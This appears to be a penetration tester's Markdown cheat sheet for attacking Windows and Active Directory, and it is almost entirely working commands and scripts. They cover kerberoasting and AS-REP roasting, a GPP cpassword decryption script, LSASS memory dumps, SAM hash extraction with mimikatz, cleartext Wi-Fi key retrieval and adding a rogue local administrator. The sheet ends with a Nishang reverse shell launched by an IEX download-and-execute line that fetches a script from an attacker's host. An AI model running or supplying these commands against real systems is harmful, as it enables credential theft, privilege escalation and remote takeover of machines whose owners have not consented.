Windows
=======


### KerberosUnConstrainedDelegation

More information [here](https://adsecurity.org/?p=1667)

```powershell
$ Import-Module ActiveDirectory
$ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'

# UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION)
# UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
$ $computers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))")).FindAll().Properties
$ foreach($c in $computers) { echo "$($c.name) ($($c.useraccountcontrol))" }
```

The website [LdapWiki](https://ldapwiki.com/wiki/) explains how to write a LDAP query. For instance,
if we want to use bitwise in ldap queries, we need to use some special arguments.

There are two Bitwise operation Extensible Match Rules.
```
1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
```

![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)

With [Rubeus](https://github.com/GhostPack/Rubeus), it's possible to dump the hashes:

```bash
Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /domain:"<fqdn_dom>" /outfile:"kerberoast.hash.txt"
```


### Kerberos preauthentication

A domain user can have the property "Do net required Kerberos preauthentication".
In this configuration, it's possible to ask to the KDC a TGT that is signed with
the user password. So the clear password can be retrieve with a brute-force attack.

The goal is to list the users that have this settings enable:

- [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1) : `Get-DomainUser -PreauthNotRequired`
- LDAP: `userAccountControl:1.2.840.113556.1.4.803:=4194304`

```powershell
$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))")).FindAll()
```

Then you can use the `impacket` script [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
to get the TGT in a format the `John` or `Hashcat ` can brute-force:

```bash
python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt
```

From [@harmj0y](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).


### List deleted users

```powershell
$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter "(objectClass=user)" -IncludeDeletedObjects -properties *
foreach ($object in $objects) { $object }
```


### Collect AD users information
```powershell
# Helping functions
function Get-ADUserDirectoryEntry($user) {
    return (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$user))")).FindOne().GetDirectoryEntry()
}

function Get-ADUserGroups($user) {
    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
    $groups = $userDirectoryEntry.memberOf

    return $groups
}

function Get-ADGroupMembers($GroupName) {
    if ($GroupName -like "CN=*") {
        $GroupDistinguishedName = $GroupName
    } else {
        # find the distinguished name from the group name
        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Group)(cn=$GroupName))")).FindOne().GetDirectoryEntry().distinguishedName
    }

    # limited to the first 10k entries
    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))")).FindAll()

    return $GroupMembers.properties
}

# Get "Domain admins" users, be carefull the name may change depending on the DC lang
$DomainAdmins = Get-ADGroupMembers("Domain Admins")
foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccountname))" }

#
(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(cn=SCU44625))")).FindAll()
```


### Decrypt GPO with cpassword
```python
#!/usr/bin/python

import sys
import binascii

from Crypto.Cipher import AES
from base64 import b64decode

unpad = lambda s: s[:-1 * ord(s[-1])]

def decrypt(cpassword):
    # Init the key
    # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")

    # Add padding to the base64 string and decode it
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
    o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)

    return unpad(o).decode("utf16")

def main():
    if len(sys.argv) != 2:
        print("Usage: gpprefdecrypt.py <cpassword>")
        sys.exit(0)

    cpassword = sys.argv[1]
    o = decrypt(cpassword)

    print o

if __name__ == "__main__":
    main()
```


### Use Win32 API in Python
Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)


### Get NTP configuration server
```bash
$ w32tm /query /status
```


### Windows 10 versions
[Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)


### Dump LSASS process

There is various methods to dump the `lsass` process memory:

- Mimikatz
- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
- TaskManager
- Rundll32
- [lsassy](https://github.com/Hackndo/lsassy)


#### Procdump
```bash
procdump -accepteula -ma lsass.exe lsass.dmp
```

#### Rundll32 & comsvcs.dll
```bash
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
```


### SAM and SYSTEM backup
```bash
$ reg save HKLM\SYSTEM SystemBkup.hiv
$ reg save HKLM\SAM SamBkup.hiv
```

Then with `mimikatz` you can recover the hashes:
```bash
$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
```


### List Email aliases
```powershell
$ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses
```


### Truster Account
The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows:

```
sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
```


### Compile .Net without Visual Studio
```bash
$ cd \Windows\Microsoft.NET\Framework\v4*
$ msbuild "path\to\SharpUp-master\SharpUp.sln" /t:Rebuild /p:Configuration=Release /p:Platform="Any CPU"
```

Or to compile a single file:
```bash
$ cd \Windows\Microsoft.NET\Framework\v4.0.30319
$ csc.exe /t:exe /out:path\to\main.exe path\to\main.cs
```

```csharp
using System;

public class HelloWorld {
    public static void Main()
    {
        Console.WriteLine("Hello world!");
    }
}
```

### List Wifi networks and password
```bash
$ netsh wlan show profile
$ netsh wlan show profile <WiFi name> key=clear
```

### TCP dump with netsh

You can use `netsh trace` to dump TCP connexions on a Windows system. The following
command start a service that dump the packets:

```bash
$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
```

To start to service, you need to type:
```bash
$ netsh trace stop
```

When the service is stopped, it create an `etl` file (and a `cab` for the report)
that contains the packets. To import it to Wireshark, you need to convert the file
to a `pcap` file. The tool `etl2pcapng` can be used to convert the file. It's
available on [Github](https://github.com/microsoft/etl2pcapng).

```bash
$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
IF: medium=eth  ID=0    IfIndex=13
Converted 3948 frames
```

### Add user to local admin
```bash
# create a local user
$ net user <username> <password> /add
# add user to local admin group
$ net localgroup Administrators <username> /add
```


### Extract Microsoft Update files

A Windows Update is a `.msu` archive that contains a `.cab` archive. This file
contains the new binaries (`.dll`, `.exe`, ...). To extract the two archive you
can use the `expand` command:

```bash
expand -f:* "update.msu" "%temp%\\update.msu"
expand -f:* "%temp%\\update.msu\\update.cab" "%temp%\\update.msu\\update.cab"
```


## User enumeration

### LDAP search

Here is two queries to fetch informations of a domain controller using LDAP:

```bash
ldapsearch -h <host> -x -s base namingcontexts
ldapsearch -h <host> -x -b "DC=xxx,DC=yyy" '(objectClass=Person)' sAMAccountName
```


### RPCClient

If the NULL session is activated on the Windows domain, then you can list the users
with `rpcclient`:

```bash
rpcclient -U '' <host>
rpcclient $> enumdomusers
rpcclient $> queryuser <user>
```


## PowerShell

Some useful PowerShell commands that you can use during your recon or privsec phases.

### Get PowerShell command history

```powershell
cd "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline"
gc ConsoleHost_history.txt
```


### Execute block as an other user

```powershell
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<dom>\<username>", $pass)
Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
```


### Download and execute script

The repository [Nishang](https://github.com/samratashok/nishang) contains a good
PowerShell script to create a [reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
You need to add the following line at the end:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
```

On your local machine:

- Create an HTTP server to serve the script: `python -m http.serve`
- Listen for an incoming [connection with nc](reverse-shell.md#listen-with-netcat).

On the remote host, execute the following PowerShell script:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
```
